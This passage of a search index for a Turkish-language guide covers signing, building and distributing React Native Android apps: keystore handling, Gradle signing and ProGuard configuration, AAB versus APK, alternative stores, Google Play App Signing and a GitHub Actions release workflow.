correct?\n  [no]:  yes\n\nEnter key password for &lt;my-key-alias&gt;\n        (RETURN if same as keystore password): ********\n</code></pre> <p>[!IMPORTANT] \u015eifreleri Kaydedin:</p> <ul> <li>Keystore password</li> <li>Key alias</li> <li>Key password</li> </ul> <p>Bu bilgileri g\u00fcvenli bir yerde (password manager) saklay\u0131n!</p>"},{"location":"android/01-keystore-basics/#keystoreu-guvenli-saklama","title":"Keystore'u G\u00fcvenli Saklama \ud83d\udd12","text":""},{"location":"android/01-keystore-basics/#gitignorea-ekleyin","title":".gitignore'a Ekleyin","text":"<pre><code># android/app/.gitignore\n*.keystore\n*.jks\n</code></pre>"},{"location":"android/01-keystore-basics/#yedekleme","title":"Yedekleme","text":"<pre><code># Keystore'u g\u00fcvenli bir yere yedekleyin\n# \u00d6rnek: \u015eifreli cloud storage, password manager\n\n# \u00d6NEML\u0130: Birden fazla yerde yedek tutun!\n# - Cloud storage (\u015fifreli)\n# - External hard drive\n# - Password manager\n</code></pre>"},{"location":"android/01-keystore-basics/#keystore-bilgilerini-saklama","title":"Keystore Bilgilerini Saklama","text":"<p>gradle.properties (local):</p> <pre><code># android/gradle.properties (GIT'E EKLEMEY\u0130N!)\nMYAPP_UPLOAD_STORE_FILE=my-upload-key.keystore\nMYAPP_UPLOAD_KEY_ALIAS=my-key-alias\nMYAPP_UPLOAD_STORE_PASSWORD=your_keystore_password\nMYAPP_UPLOAD_KEY_PASSWORD=your_key_password\n</code></pre> <p>[!WARNING] <code>gradle.properties</code> dosyas\u0131n\u0131 asla Git'e eklemeyin!</p>"},{"location":"android/01-keystore-basics/#gradle-konfigurasyonu","title":"Gradle Konfig\u00fcrasyonu \u2699\ufe0f","text":""},{"location":"android/02-gradle-config/","title":"Gradle Konfig\u00fcrasyonu","text":""},{"location":"android/02-gradle-config/#androidappbuildgradle-hibrit-yaklasm","title":"android/app/build.gradle (Hibrit Yakla\u015f\u0131m)","text":"<pre><code>android {\n    ...\n    defaultConfig { ... }\n\n    // Signing configs (Env Vars &gt; gradle.properties)\n    signingConfigs {\n        debug {\n            storeFile file('debug.keystore')\n            storePassword 'android'\n            keyAlias 'androiddebugkey'\n            keyPassword 'android'\n        }\n        release {\n            // \u00d6ncelik: Environment Variables -&gt; gradle.properties\n            def keystoreFile = System.getenv(\"MYAPP_UPLOAD_STORE_FILE\") ?: project.findProperty(\"MYAPP_UPLOAD_STORE_FILE\")\n            def keystorePassword = System.getenv(\"MYAPP_UPLOAD_STORE_PASSWORD\") ?: project.findProperty(\"MYAPP_UPLOAD_STORE_PASSWORD\")\n            def keyAlias = System.getenv(\"MYAPP_UPLOAD_KEY_ALIAS\") ?: project.findProperty(\"MYAPP_UPLOAD_KEY_ALIAS\")\n            def keyPassword = System.getenv(\"MYAPP_UPLOAD_KEY_PASSWORD\") ?: project.findProperty(\"MYAPP_UPLOAD_KEY_PASSWORD\")\n\n            if (keystoreFile) {\n                storeFile file(keystoreFile)\n                storePassword keystorePassword\n                keyAlias keyAlias\n                keyPassword keyPassword\n            }\n        }\n    }\n\n    buildTypes {\n        debug {\n            signingConfig signingConfigs.debug\n        }\n        release {\n            // Proguard/R8 minification\n            minifyEnabled true\n            shrinkResources true\n            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'\n\n            // Signing\n            signingConfig signingConfigs.release\n        }\n    }\n}\n</code></pre> <p>[!TIP] Hibrit Yakla\u015f\u0131m Avantajlar\u0131:</p> <ul> <li>Local development: <code>gradle.properties</code> kullan\u0131r</li> <li>CI/CD: Environment variables kullan\u0131r (daha g\u00fcvenli)</li> <li><code>gradle.properties</code> dosyas\u0131 olu\u015fturmaya gerek kalmaz</li> </ul>"},{"location":"android/02-gradle-config/#proguardr8-rules-detayl","title":"ProGuard/R8 Rules (Detayl\u0131)","text":"<pre><code># android/app/proguard-rules.pro\n\n# ===== React Native Core =====\n-keep class com.facebook.react.** { *; }\n-keep class com.facebook.hermes.** { *; }\n-keep class com.facebook.jni.** { *; }\n\n# React Native Gesture Handler\n-keep class com.swmansion.gesturehandler.** { *; }\n\n# React Native Reanimated\n-keep class com.swmansion.reanimated.** { *; }\n\n# ===== Retrofit (API Calls) =====\n-keepattributes Signature\n-keepattributes *Annotation*\n-keep class retrofit2.** { *; }\n-keepclasseswithmembers class * {\n    @retrofit2.http.* &lt;methods&gt;;\n}\n\n# ===== OkHttp =====\n-dontwarn okhttp3.**\n-dontwarn okio.**\n-keep class okhttp3.** { *; }\n-keep interface okhttp3.** { *; }\n\n# ===== Gson/JSON =====\n-keep class com.google.gson.** { *; }\n-keepclassmembers,allowobfuscation class * {\n  @com.google.gson.annotations.SerializedName &lt;fields&gt;;\n}\n\n# ===== Firebase =====\n-keep class com.google.firebase.** { *; }\n-keep class com.google.android.gms.** { *; }\n-dontwarn com.google.firebase.**\n\n# ===== Your App Models =====\n-keep class com.yourapp.models.** { *; }\n-keep class com.yourapp.api.** { *; }\n\n# ===== General =====\n-keepattributes SourceFile,LineNumberTable\n-keepattributes *Annotation*\n-renamesourcefileattribute SourceFile\n</code></pre>"},{"location":"android/02-gradle-config/#release-apkaab-olusturma","title":"Release APK/AAB Olu\u015fturma \ud83d\udce6","text":""},{"location":"android/02-gradle-config/#aab-android-app-bundle-onerilen","title":"AAB (Android App Bundle) - \u00d6nerilen","text":"<p>```bash</p>"},{"location":"android/02-gradle-config/#proje-root-dizininde","title":"Proje root dizininde","text":"<p>cd android</p>"},{"location":"android/02-gradle-config/#release-aab-olustur","title":"Release AAB olu\u015ftur","text":"<p>./gradlew bundleRelease</p>"},{"location":"android/03-build-release/","title":"Build ve Release","text":""},{"location":"android/03-build-release/#ckt","title":"\u00c7\u0131kt\u0131:","text":""},{"location":"android/03-build-release/#androidappbuildoutputsbundlereleaseapp-releaseaab","title":"android/app/build/outputs/bundle/release/app-release.aab","text":"<pre><code>### APK (Alternative)\n\n```bash\n# Release APK olu\u015ftur\n./gradlew assembleRelease\n\n# \u00c7\u0131kt\u0131:\n# android/app/build/outputs/apk/release/app-release.apk\n</code></pre>"},{"location":"android/03-build-release/#build-temizleme","title":"Build Temizleme","text":"<pre><code># Cache temizle\n./gradlew clean\n\n# Sonra tekrar build\n./gradlew bundleRelease\n</code></pre>"},{"location":"android/03-build-release/#aab-vs-apk-hangisini-kullanmal","title":"AAB vs APK: Hangisini Kullanmal\u0131? \ud83e\udd14","text":"<p>[!IMPORTANT] Google Play: AAB zorunlu (2021'den beri) Di\u011fer platformlar: APK kullan\u0131labilir</p> <p>Kar\u015f\u0131la\u015ft\u0131rma:</p> \u00d6zellik AAB (Android App Bundle) APK (Android Package) Google Play \u2705 Zorunlu \u274c Art\u0131k kabul edilmiyor Dosya Boyutu \u2705 %35 daha k\u00fc\u00e7\u00fck \u274c Daha b\u00fcy\u00fck Optimizasyon \u2705 Cihaza \u00f6zel \u274c Evrensel Direkt Y\u00fckleme \u274c M\u00fcmk\u00fcn de\u011fil \u2705 M\u00fcmk\u00fcn F-Droid \u274c Desteklemiyor \u2705 Destekliyor GitHub Releases \u274c Kullan\u0131c\u0131 y\u00fckleyemez \u2705 Direkt indirip y\u00fckler <p>Ne Zaman AAB?</p> <ul> <li>\u2705 Google Play Store'a y\u00fckleme</li> <li>\u2705 Dosya boyutu \u00f6nemli</li> <li>\u2705 Otomatik optimizasyon istiyorsan\u0131z</li> </ul> <p>Ne Zaman APK?</p> <ul> <li>\u2705 Direkt kullan\u0131c\u0131lara da\u011f\u0131t\u0131m</li> <li>\u2705 F-Droid, APKPure gibi alternatif ma\u011fazalar</li> <li>\u2705 GitHub Releases</li> <li>\u2705 Kendi web sitenizden indirme</li> <li>\u2705 Beta test (Google Play d\u0131\u015f\u0131nda)</li> </ul>"},{"location":"android/03-build-release/#alternatif-dagtm-kanallar-apk","title":"Alternatif Da\u011f\u0131t\u0131m Kanallar\u0131 (APK)","text":""},{"location":"android/03-build-release/#1-f-droid-ack-kaynak-uygulamalar","title":"1. F-Droid (A\u00e7\u0131k Kaynak Uygulamalar)","text":"<p>F-Droid Nedir?</p> <ul> <li>A\u00e7\u0131k kaynak Android uygulamalar\u0131 i\u00e7in alternatif ma\u011faza</li> <li>Tamamen \u00fccretsiz ve reklams\u0131z</li> <li>Gizlilik odakl\u0131 (tracking yok)</li> <li>Kaynak kodu a\u00e7\u0131k olmal\u0131</li> </ul> <p>Nas\u0131l Yay\u0131nlan\u0131r?</p> <pre><code># 1. Uygulaman\u0131z\u0131 a\u00e7\u0131k kaynak yap\u0131n (GitHub)\n# 2. F-Droid'e ba\u015fvuru yap\u0131n\n# https://f-droid.org/docs/Inclusion_Policy/\n\n# 3. Metadata dosyas\u0131 olu\u015fturun\n# fdroiddata/metadata/com.yourapp.txt\n\n# 4. F-Droid build server'\u0131 APK'y\u0131 olu\u015fturur\n# (Sizin keystore'unuz kullan\u0131lmaz, F-Droid'in kendi keystore'u)\n</code></pre> <p>Avantajlar:</p> <ul> <li>\u2705 Tamamen \u00fccretsiz</li> <li>\u2705 Gizlilik odakl\u0131 kullan\u0131c\u0131lar</li> <li>\u2705 Otomatik g\u00fcncellemeler</li> <li>\u2705 Google Play'e alternatif</li> </ul> <p>Dezavantajlar:</p> <ul> <li>\u274c Kaynak kodu a\u00e7\u0131k olmal\u0131</li> <li>\u274c F-Droid kendi keystore'u kullan\u0131r (Google Play ile ayn\u0131 APK de\u011fil)</li> <li>\u274c \u0130nceleme s\u00fcreci uzun (haftalar)</li> </ul>"},{"location":"android/03-build-release/#2-github-releases-en-kolay","title":"2. GitHub Releases (En Kolay)","text":"<p>Nas\u0131l Yap\u0131l\u0131r?</p> <pre><code># 1. Release APK olu\u015ftur\ncd android &amp;&amp; ./gradlew assembleRelease\n\n# 2. GitHub'da release olu\u015ftur\n# Repository \u2192 Releases \u2192 Create new release\n\n# 3. APK'y\u0131 upload et\n# Tag: v1.0.0\n# Title: Version 1.0.0\n# Description: Release notes\n# Assets: app-release.apk (upload)\n\n# 4. Publish release\n</code></pre> <p>Kullan\u0131c\u0131 \u0130ndirme:</p> <pre><code>https://github.com/yourname/yourapp/releases/latest\n\u2192 app-release.apk indir\n\u2192 Cihaza y\u00fckle (Unknown sources aktif olmal\u0131)\n</code></pre> <p>Avantajlar:</p> <ul> <li>\u2705 \u00c7ok kolay</li> <li>\u2705 \u00dccretsiz</li> <li>\u2705 Versiyon kontrol\u00fc</li> <li>\u2705 Changelog ekleyebilirsin</li> </ul> <p>Dezavantajlar:</p> <ul> <li>\u274c Otomatik g\u00fcncelleme yok</li> <li>\u274c Kullan\u0131c\u0131 \"Unknown sources\" aktif etmeli</li> <li>\u274c Google Play kadar g\u00fcvenilir de\u011fil (kullan\u0131c\u0131 g\u00f6z\u00fcnde)</li> </ul>"},{"location":"android/03-build-release/#3-apkpure-apkmirror","title":"3. APKPure / APKMirror","text":"<p>APKPure:</p> <ul> <li>\u00dc\u00e7\u00fcnc\u00fc parti APK ma\u011fazas\u0131</li> <li>Ba\u015fvuru: https://apkpure.com/developer</li> <li>\u00dccretsiz</li> </ul> <p>APKMirror:</p> <ul> <li>Sadece pop\u00fcler uygulamalar</li> <li>Ba\u015fvuru: https://www.apkmirror.com/apk-upload/</li> </ul>"},{"location":"android/03-build-release/#4-kendi-web-siteniz","title":"4. Kendi Web Siteniz","text":"<p>Basit Y\u00f6ntem:</p> <pre><code>&lt;!-- index.html --&gt;\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n  &lt;head&gt;\n    &lt;title&gt;MyApp Download&lt;/title&gt;\n  &lt;/head&gt;\n  &lt;body&gt;\n    &lt;h1&gt;Download MyApp&lt;/h1&gt;\n    &lt;a href=\"app-release.apk\" download&gt;\n      &lt;button&gt;Download APK (v1.0.0)&lt;/button&gt;\n    &lt;/a&gt;\n\n    &lt;h2&gt;Installation:&lt;/h2&gt;\n    &lt;ol&gt;\n      &lt;li&gt;Download APK&lt;/li&gt;\n      &lt;li&gt;Settings \u2192 Security \u2192 Enable \"Unknown sources\"&lt;/li&gt;\n      &lt;li&gt;Open APK file&lt;/li&gt;\n      &lt;li&gt;Install&lt;/li&gt;\n    &lt;/ol&gt;\n  &lt;/body&gt;\n&lt;/html&gt;\n</code></pre> <p>Hosting:</p> <ul> <li>GitHub Pages (\u00fccretsiz)</li> <li>Netlify (\u00fccretsiz)</li> <li>Vercel (\u00fccretsiz)</li> <li>Kendi sunucunuz</li> </ul>"},{"location":"android/03-build-release/#5-samsung-galaxy-store","title":"5. Samsung Galaxy Store","text":"<p>Samsung cihazlar i\u00e7in alternatif:</p> <ul> <li>https://seller.samsungapps.com/</li> <li>APK kabul ediyor (AAB de\u011fil)</li> <li>Samsung cihazlarda pre-installed</li> </ul>"},{"location":"android/03-build-release/#dagtm-stratejisi-onerisi","title":"Da\u011f\u0131t\u0131m Stratejisi \u00d6nerisi","text":"<p>\u00c7oklu Platform Stratejisi:</p> <pre><code>1. Google Play Store (AAB)\n   \u251c\u2500 Ana da\u011f\u0131t\u0131m kanal\u0131\n   \u251c\u2500 Otomatik g\u00fcncellemeler\n   \u2514\u2500 En geni\u015f kitle\n\n2. F-Droid (APK - a\u00e7\u0131k kaynak)\n   \u251c\u2500 Gizlilik odakl\u0131 kullan\u0131c\u0131lar\n   \u251c\u2500 A\u00e7\u0131k kaynak toplulu\u011fu\n   \u2514\u2500 Google-free cihazlar\n\n3. GitHub Releases (APK)\n   \u251c\u2500 Beta testerlar\n   \u251c\u2500 Erken eri\u015fim\n   \u2514\u2500 Geli\u015ftirici toplulu\u011fu\n\n4. Kendi Web Siteniz (APK)\n   \u251c\u2500 Direkt kontrol\n   \u251c\u2500 Analytics\n   \u2514\u2500 \u00d6zel landing page\n</code></pre> <p>\u00d6rnek Senaryo:</p> <pre><code># 1. Google Play i\u00e7in AAB\n./gradlew bundleRelease\n# \u2192 Play Console'a y\u00fckle\n\n# 2. F-Droid / GitHub / Web i\u00e7in APK\n./gradlew assembleRelease\n# \u2192 GitHub Releases'e y\u00fckle\n# \u2192 Web sitene y\u00fckle\n</code></pre> <p>[!TIP] Best Practice:</p>"},{"location":"android/04-google-play/","title":"Google Play Console","text":""},{"location":"android/04-google-play/#apkaab-test-etme","title":"APK/AAB Test Etme \ud83e\uddea","text":""},{"location":"android/04-google-play/#aabyi-apkya-cevirme-test-icin","title":"AAB'yi APK'ya \u00c7evirme (Test \u0130\u00e7in)","text":"<pre><code># bundletool indir\n# https://github.com/google/bundletool/releases\n\n# AAB'den APK olu\u015ftur\njava -jar bundletool.jar build-apks \\\n  --bundle=app-release.aab \\\n  --output=app-release.apks \\\n  --mode=universal\n\n# APK'y\u0131 extract et\nunzip app-release.apks -d output\n\n# Cihaza y\u00fckle\nadb install output/universal.apk\n</code></pre>"},{"location":"android/04-google-play/#imza-dogrulama","title":"\u0130mza Do\u011frulama","text":"<pre><code># APK imzas\u0131n\u0131 kontrol et\njarsigner -verify -verbose -certs app-release.apk\n\n# Detayl\u0131 bilgi\nkeytool -printcert -jarfile app-release.apk\n</code></pre>"},{"location":"android/04-google-play/#google-play-upload","title":"Google Play Upload \ud83d\ude80","text":""},{"location":"android/04-google-play/#play-consoleda-uygulama-olusturma","title":"Play Console'da Uygulama Olu\u015fturma","text":"<ol> <li>Google Play Console'a girin</li> <li>\"Create app\" t\u0131klay\u0131n</li> <li>Uygulama bilgilerini doldurun</li> <li>\"Create app\" t\u0131klay\u0131n</li> </ol>"},{"location":"android/04-google-play/#aab-upload","title":"AAB Upload","text":"<ol> <li>Production &gt; Releases &gt; Create new release</li> <li>AAB dosyas\u0131n\u0131 upload edin</li> <li>Release notes ekleyin</li> <li>Review release &gt; Start rollout to production</li> </ol>"},{"location":"android/04-google-play/#app-signing-by-google-play-onerilen","title":"App Signing by Google Play (\u00d6nerilen)","text":"<p>[!CAUTION] ZORUNLU HALE GEL\u0130YOR (2025): Google Play App Signing, 2025 sonuna kadar t\u00fcm yeni uygulamalar i\u00e7in zorunlu olacak! Mevcut uygulamalar i\u00e7in de \u015fiddetle \u00f6nerilir.</p> <p>[!TIP] Google Play App Signing kullanman\u0131z \u00f6nerilir:</p> <ul> <li>Google, keystore'unuzu y\u00f6netir</li> <li>Keystore kayb\u0131 riski ortadan kalkar</li> <li>Upload key ile signing key ayr\u0131l\u0131r</li> </ul> <p>Nas\u0131l Aktif Edilir:</p> <ol> <li>Play Console &gt; Setup &gt; App signing</li> <li>Use Google Play App Signing se\u00e7in</li> <li>Upload key'inizi y\u00fckleyin</li> </ol> <p>Upload Key vs Signing Key:</p> <pre><code>\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510    \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502      Sen        \u2502    \u2502   Google Play    \u2502    \u2502   Kullan\u0131c\u0131     \u2502\n\u2502  Upload Key     \u2502 \u2500\u2500\u25ba\u2502  Signing Key     \u2502 \u2500\u2500\u25ba\u2502   \u0130ndirir       \u2502\n\u2502   (senin)       \u2502    \u2502  (Google'\u0131n)     \u2502    \u2502                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518    \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Farklar:</p> \u00d6zellik Upload Key Signing Key Sahibi Sen olu\u015fturursun Google saklar Kullan\u0131m AAB'yi Google'a y\u00fcklerken Cihazlara da\u011f\u0131t\u0131rken Kaybedilirse \u2705 Yenilenebilir \u274c Google saklar, sorun yok G\u00fcvenlik Senin sorumlulu\u011fun Google'\u0131n sorumlulu\u011fu <p>[!TIP] Mevcut Uygulamay\u0131 App Signing'e Ta\u015f\u0131ma:</p> <p>E\u011fer daha \u00f6nce App Signing olmadan yay\u0131nlad\u0131ysan\u0131z:</p> <ol> <li>Play Console \u2192 Setup \u2192 App signing</li> <li>\"Use a different key\" se\u00e7</li> <li>PEPK tool ile mevcut keystore'u export et:</li> </ol> <pre><code>java -jar pepk.jar \\\n  --keystore=my-upload-key.keystore \\\n  --alias=my-key-alias \\\n  --output=encrypted_private_key.zip \\\n  --encryptionkey=GOOGLE_PROVIDED_KEY\n</code></pre> <ol> <li><code>encrypted_private_key.zip</code>'i upload et</li> </ol>"},{"location":"android/04-google-play/#apk-imza-semalar-v1v2v3","title":"APK \u0130mza \u015eemalar\u0131 (V1/V2/V3)","text":"<p>\u0130mza \u015eemalar\u0131:</p> \u015eema Android A\u00e7\u0131klama V1 (JAR) T\u00fcm\u00fc Eski y\u00f6ntem, yava\u015f do\u011frulama V2 7.0+ APK Signature Scheme v2 V3 9.0+ Key rotation deste\u011fi V4 11+ Incremental installs <p>Gradle Konfig\u00fcrasyonu:</p> <pre><code>// android/app/build.gradle\nandroid {\n    signingConfigs {\n        release {\n            // ... (keystore config)\n\n            // \u0130mza \u015femalar\u0131n\u0131 aktif et\n            v1SigningEnabled true\n            v2SigningEnabled true\n            enableV3Signing true  // Key rotation (API 28+)\n            enableV4Signing true  // Incremental installs (API 30+)\n        }\n    }\n}\n</code></pre> <p>[!NOTE] V3/V4 Signing:</p> <ul> <li><code>enableV3Signing</code>: Key rotation deste\u011fi (Android 9.0+)</li> <li><code>enableV4Signing</code>: Incremental updates (Android 11+)</li> <li>Her ikisi de performans art\u0131\u015f\u0131 sa\u011flar</li> </ul>"},{"location":"android/04-google-play/#version-yonetimi","title":"Version Y\u00f6netimi \ud83d\udcc8","text":""},{"location":"android/04-google-play/#androidappbuildgradle","title":"android/app/build.gradle","text":"<pre><code>android {\n    defaultConfig {\n        applicationId \"com.yourapp\"\n        minSdkVersion 21\n        targetSdkVersion 34  // Google Play minimum requirement (2024+)\n\n        // Version Code (her release'de art\u0131r\u0131n)\n        versionCode 1\n\n        // Version Name (kullan\u0131c\u0131ya g\u00f6sterilen)\n        versionName \"1.0.0\"\n    }\n}\n</code></pre> <p>[!WARNING] Target SDK Zorunlulu\u011fu: Google Play, her y\u0131l\u0131n sonuna do\u011fru yeni uygulamalar ve g\u00fcncellemeler i\u00e7in <code>targetSdkVersion</code>'\u0131 y\u00fckseltmeyi zorunlu k\u0131lar.</p> <ul> <li>2024: Minimum API 34 (Android 14)</li> <li>2025: Muhtemelen API 35</li> </ul> <p>Eski targetSdk ile uygulama g\u00fcncellenemez!</p>"},{"location":"android/04-google-play/#version-artrma-stratejisi","title":"Version Art\u0131rma Stratejisi","text":"<pre><code>versionCode: 1, 2, 3, 4, ... (her release'de +1)\nversionName: \"1.0.0\", \"1.0.1\", \"1.1.0\", \"2.0.0\" (semantic versioning)\n</code></pre> <p>\u00d6rnek:</p> <ul> <li><code>1.0.0</code> \u2192 <code>1.0.1</code> (bug fix)</li> <li><code>1.0.1</code> \u2192 <code>1.1.0</code> (yeni \u00f6zellik)</li> <li><code>1.1.0</code> \u2192 <code>2.0.0</code> (breaking change)</li> </ul>"},{"location":"android/04-google-play/#cicd-entegrasyonu","title":"CI/CD Entegrasyonu \ud83d\udd04","text":""},{"location":"android/04-google-play/#github-actions-ornegi","title":"GitHub Actions \u00d6rne\u011fi","text":"<pre><code># .github/workflows/android-release.yml\nname: Android Release\n\non:\n  push:\n    tags:\n      - \"v*\"\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - name: Set up JDK\n        uses: actions/setup-java@v4\n        with:\n          java-version: \"17\"\n          distribution: \"temurin\"\n\n      - name: Setup Node.js\n        uses: actions/setup-node@v4\n        with:\n          node-version: \"20\"\n\n      - name: Install dependencies\n        run: npm ci\n\n      - name: Decode Keystore\n        run: |\n          echo \"${{ secrets.KEYSTORE_BASE64 }}\" | base64 -d &gt; android/app/my-upload-key.keystore\n\n      - name: Create gradle.properties\n        run: |\n          echo \"MYAPP_UPLOAD_STORE_FILE=my-upload-key.keystore\" &gt;&gt; android/gradle.properties\n          echo \"MYAPP_UPLOAD_KEY_ALIAS=${{ secrets.KEY_ALIAS }}\" &gt;&gt; android/gradle.properties\n          echo \"MYAPP_UPLOAD_STORE_PASSWORD=${{ secrets.KEYSTORE_PASSWORD }}\" &gt;&gt; android/gradle.properties\n          echo \"MYAPP_UPLOAD_KEY_PASSWORD=${{ secrets.KEY_PASSWORD }}\" &gt;&gt; android/gradle.properties\n\n      - name: Build AAB\n        run: |\n          cd android\n          ./gradlew bundleRelease\n\n      - name: Upload AAB\n        uses: actions/upload-artifact@v4\n        with:\n          name: app-release.aab\n          path: android/app/build/outputs/bundle/release/app-release.aab\n</code></pre>"},{"location":"android/04-google-play/#github-secrets-ekleme","title":"GitHub Secrets Ekleme","text":"<pre><code># Keystore'u base64'e \u00e7evir\nbase64 -i android/app/my-upload-key.keystore | pbcopy\n\n# GitHub &gt; Settings &gt; Secrets &gt; Actions &gt; New repository secret\n# KEYSTORE_BASE64: (paste)\n# KEY_ALIAS: my-key-alias\n# KEYSTORE_PASSWORD: your_password\n# KEY_PASSWORD: your_password\n</code></pre>"},{"location":"android/04-google-play/#troubleshooting","title":"Troubleshooting \ud83d\udd0d","text":""},{"location":"android/04-google-play/#yaygn-hatalar","title":"Yayg\u0131n Hatalar","text":"<p>Hata: \"Failed to read key\"</p>"},{"location":"android/05-troubleshooting/","title":"Troubleshooting ve Checklist","text":"<pre><code>### Keystore Bilgilerini G\u00f6r\u00fcnt\u00fcleme\n\n```bash\n# Keystore i\u00e7eri\u011fini listele\nkeytool -list -v -keystore my-upload-key.keystore\n\n# Alias'lar\u0131 g\u00f6ster\nkeytool -list -keystore my-upload-key.keystore\n\n# Sertifika detaylar\u0131\nkeytool -list -v -keystore my-upload-key.keystore -alias my-key-alias\n</code></pre>"},{"location":"android/05-troubleshooting/#checklist-production-release","title":"Checklist: Production Release \ud83d\udccb","text":"<ul> <li>[ ] Keystore olu\u015fturuldu ve g\u00fcvenli yerde sakland\u0131</li> <li>[ ] Keystore \u015fifreleri kaydedildi (password manager)</li> <li>[ ] <code>.gitignore</code>'a <code>*.keystore</code> eklendi</li> <li>[ ] <code>gradle.properties</code> konfig\u00fcre edildi</li> <li>[ ] <code>build.gradle</code> signing config eklendi</li> <li>[ ] <code>versionCode</code> ve <code>versionName</code> g\u00fcncellendi</li> <li>[ ] ProGuard/R8 aktif (<code>minifyEnabled true</code>)</li> <li>[ ] Release AAB/APK build edildi</li> <li>[ ] \u0130mza do\u011fruland\u0131 (<code>jarsigner -verify</code>)</li> <li>[ ] Test cihaz\u0131nda \u00e7al\u0131\u015ft\u0131r\u0131ld\u0131</li> <li>[ ] Google Play Console'da uygulama olu\u015fturuldu</li> <li>[ ] App Signing by Google Play aktif</li> <li>[ ] AAB upload edildi</li> <li>[ ] Release notes eklendi</li> </ul>"},{"location":"android/05-troubleshooting/#guvenlik-best-practices","title":"G\u00fcvenlik Best Practices \ud83d\udd10","text":"<ol> <li>Keystore G\u00fcvenli\u011fi:</li> <li>Asla Git'e commit etmeyin</li> <li>Birden fazla yerde yedekleyin</li> <li> <p>\u015eifreli cloud storage kullan\u0131n</p> </li> <li> <p>\u015eifre Y\u00f6netimi:</p> </li> <li>G\u00fc\u00e7l\u00fc \u015fifreler kullan\u0131n (16+ karakter)</li> <li>Password manager kullan\u0131n</li> <li> <p>\u015eifreleri kimseyle payla\u015fmay\u0131n</p> </li> <li> <p>CI/CD:</p> </li> <li>Secrets'\u0131 environment variables olarak saklay\u0131n</li> <li>Base64 encode edin</li> <li> <p>Logs'da \u015fifreleri expose etmeyin</p> </li> <li> <p>Google Play App Signing:</p> </li> <li>Mutlaka aktif edin</li> <li>Upload key ile signing key ayr\u0131 olsun</li> <li>Keystore kayb\u0131 riskini minimize edin</li> </ol>"},{"location":"android/05-troubleshooting/#eksik-kritik-konular","title":"Eksik Kritik Konular \u26a0\ufe0f","text":""},{"location":"android/05-troubleshooting/#sha-256-fingerprint-firebasegoogle-services-icin","title":"SHA-256 Fingerprint (Firebase/Google Services \u0130\u00e7in)","text":"<p>Firebase, Google Sign-In, Google Maps kullan\u0131yorsan\u0131z mutlaka gerekli:</p> <pre><code># Release keystore'un SHA-256 fingerprint'ini al\u0131n\nkeytool -list -v -keystore android/app/my-upload-key.keystore -alias my-key-alias\n\n# \u00c7\u0131kt\u0131da \u015funu aray\u0131n:\n# SHA256: AB:CD:EF:12:34:56:78:90:AB:CD:EF:12:34:56:78:90:...\n</code></pre> <p>Firebase Console'a Ekleme:</p> <ol> <li>Firebase Console \u2192 Project Settings \u2192 Your apps</li> <li>Android app se\u00e7in</li> <li>Add fingerprint \u2192 SHA-256'y\u0131 yap\u0131\u015ft\u0131r\u0131n</li> <li><code>google-services.json</code> dosyas\u0131n\u0131 yeniden indirin</li> <li><code>android/app/google-services.json</code> dosyas\u0131n\u0131 g\u00fcncelleyin</li> </ol> <p>[!IMPORTANT] Debug ve Release i\u00e7in ayr\u0131 fingerprint'ler:</p> <ul> <li>Debug: <code>~/.android/debug.keystore</code> (otomatik)</li> <li>Release: <code>my-upload-key.keystore</code> (sizin olu\u015fturdu\u011funuz)</li> </ul> <p>Her ikisini de Firebase'e eklemelisiniz!</p>"},{"location":"android/05-troubleshooting/#64-bit-gereksinimi-2019dan-beri-zorunlu","title":"64-bit Gereksinimi (2019'dan beri zorunlu)","text":"<p>Google Play, 64-bit deste\u011fi zorunlu k\u0131lm\u0131\u015ft\u0131r:</p> <p>android/app/build.gradle:</p> <pre><code>android {\n    defaultConfig {\n        ...\n        ndk {\n            abiFilters \"armeabi-v7a\", \"arm64-v8a\", \"x86\", \"x86_64\"\n        }\n    }\n\n    // Split APKs (\u00f6nerilen)\n    splits {\n        abi {\n            enable true\n            reset()\n            include \"armeabi-v7a\", \"arm64-v8a\"\n            universalApk false\n            enable gradle.startParameter.taskNames.any { it.contains(\"Release\") }\n        }\n    }\n}\n</code></pre> <p>Kontrol:</p> <pre><code># AAB i\u00e7eri\u011fini kontrol et\nunzip -l android/app/build/outputs/bundle/release/app-release.aab | grep \"lib/\"\n\n# \u015eunlar\u0131 g\u00f6rmeli:\n# lib/arm64-v8a/    \u2190 64-bit ARM (zorunlu!)\n# lib/armeabi-v7a/  \u2190 32-bit ARM\n</code></pre>"},{"location":"android/05-troubleshooting/#internal-testing-track-ilk-upload-icin","title":"Internal Testing Track (\u0130lk Upload \u0130\u00e7in)","text":"<p>Production'a direkt y\u00fckleme yapmamal\u0131s\u0131n\u0131z!</p> <p>Do\u011fru S\u00fcre\u00e7:</p> <ol> <li>Internal Testing \u2192 Tak\u0131m i\u00e7i test (20 ki\u015fiye kadar)</li> <li>Closed Testing \u2192 Beta testerlar (s\u0131n\u0131rs\u0131z)</li> <li>Open Testing \u2192 Herkese a\u00e7\u0131k beta</li> <li>Production \u2192 Canl\u0131 yay\u0131n</li> </ol> <p>Internal Testing Kurulumu:</p> <pre><code>Play Console \u2192 Testing \u2192 Internal testing\n\u2192 Create new release\n\u2192 Upload AAB\n\u2192 Testers \u2192 Create email list\n\u2192 Add emails (max 100)\n\u2192 Save \u2192 Review release \u2192 Start rollout\n</code></pre> <p>Test Linki:</p> 